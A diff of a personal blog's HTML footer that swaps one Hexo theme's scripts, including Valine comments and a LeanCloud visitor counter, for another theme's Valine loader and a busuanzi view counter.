-    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery.lazyload/1.9.3/jquery.lazyload.min.js"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/src/utils.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/src/motion.js?v=5.1.4"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/src/affix.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/src/schemes/pisces.js?v=5.1.4"></script>
-
-
-
-  
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/src/post-details.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/src/bootstrap.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-  
-  <script type="text/javascript">
-    var GUEST = ['nick','mail','link'];
-    var guest = 'nick,mail';
-    guest = guest.split(',').filter(item=>{
-      return GUEST.indexOf(item)>-1;
-    });
-    new Valine({
-        el: '#comments' ,
-        verify: false,
-        notify: false,
-        appId: 'SDu2T9KUB8UY5eF5L3dfbdyt-gzGzoHsz',
-        appKey: 'Q4E9nvCrlFLKhPtPLwXlkkxb',
-        placeholder: 'Just go go',
-        avatar:'mm',
-        guest_info:guest,
-        pageSize:'10' || 10,
-    });
-  </script>
-
-
-
-  
-
-
-
-
-
-  
-
-  
-  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
-  <script>AV.initialize("SDu2T9KUB8UY5eF5L3dfbdyt-gzGzoHsz", "Q4E9nvCrlFLKhPtPLwXlkkxb");</script>
-  <script>
-    function showTime(Counter) {
-      var query = new AV.Query(Counter);
-      var entries = [];
-      var $visitors = $(".leancloud_visitors");
-
-      $visitors.each(function () {
-        entries.push( $(this).attr("id").trim() );
-      });
-
-      query.containedIn('url', entries);
-      query.find()
-        .done(function (results) {
-          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
-
-          if (results.length === 0) {
-            $visitors.find(COUNT_CONTAINER_REF).text(0);
-            return;
-          }
-
-          for (var i = 0; i < results.length; i++) {
-            var item = results[i];
-            var url = item.get('url');
-            var time = item.get('time');
-            var element = document.getElementById(url);
-
-            $(element).find(COUNT_CONTAINER_REF).text(time);
-          }
-          for(var i = 0; i < entries.length; i++) {
-            var url = entries[i];
-            var element = document.getElementById(url);
-            var countSpan = $(element).find(COUNT_CONTAINER_REF);
-            if( countSpan.text() == '') {
-              countSpan.text(0);
-            }
-          }
-        })
-        .fail(function (object, error) {
-          console.log("Error: " + error.code + " " + error.message);
-        });
-    }
-
-    function addCount(Counter) {
-      var $visitors = $(".leancloud_visitors");
-      var url = $visitors.attr('id').trim();
-      var title = $visitors.attr('data-flag-title').trim();
-      var query = new AV.Query(Counter);
-
-      query.equalTo("url", url);
-      query.find({
-        success: function(results) {
-          if (results.length > 0) {
-            var counter = results[0];
-            counter.fetchWhenSave(true);
-            counter.increment("time");
-            counter.save(null, {
-              success: function(counter) {
-                var $element = $(document.getElementById(url));
-                $element.find('.leancloud-visitors-count').text(counter.get('time'));
-              },
-              error: function(counter, error) {
-                console.log('Failed to save Visitor num, with error message: ' + error.message);
-              }
-            });
-          } else {
-            var newcounter = new Counter();
-            /* Set ACL */
-            var acl = new AV.ACL();
-            acl.setPublicReadAccess(true);
-            acl.setPublicWriteAccess(true);
-            newcounter.setACL(acl);
-            /* End Set ACL */
-            newcounter.set("title", title);
-            newcounter.set("url", url);
-            newcounter.set("time", 1);
-            newcounter.save(null, {
-              success: function(newcounter) {
-                var $element = $(document.getElementById(url));
-                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
-              },
-              error: function(newcounter, error) {
-                console.log('Failed to create');
-              }
-            });
-          }
-        },
-        error: function(error) {
-          console.log('Error:' + error.code + " " + error.message);
-        }
-      });
-    }
-
-    $(function() {
-      var Counter = AV.Object.extend("Counter");
-      if ($('.leancloud_visitors').length == 1) {
-        addCount(Counter);
-      } else if ($('.post-title-link').length > 1) {
-        showTime(Counter);
-      }
-    });
-  </script>
-
-
-
-  
-
-  
-
-  
-  
-
-  
-
-  
-
-  
-
-</body>
-</html>
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
